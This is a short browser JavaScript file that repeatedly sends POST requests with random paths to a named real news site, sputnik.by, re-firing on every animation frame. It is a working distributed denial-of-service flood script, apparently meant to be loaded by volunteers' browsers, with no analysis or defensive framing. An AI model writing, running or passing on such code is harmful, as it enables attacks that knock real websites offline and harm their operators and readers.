(function () {
  const targets = [{
    host: 'sputnik.by',
    port: '443',
    path: '/',
  }];

  window.launchCannon = function () {
    const target = targets[Math.floor(Math.random() * targets.length)];
    // a target will have
    /*
    {
      host: 'domain.com',
      port: 553,
      path: '/',
    }
    */

    var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();
    fetch(`https://${target.host}:${target.port}${target.path}/${rand}`, {
      method: 'POST',
      options: 'no-cors',
    })
    requestAnimationFrame(window.launchCannon)
  }
})();
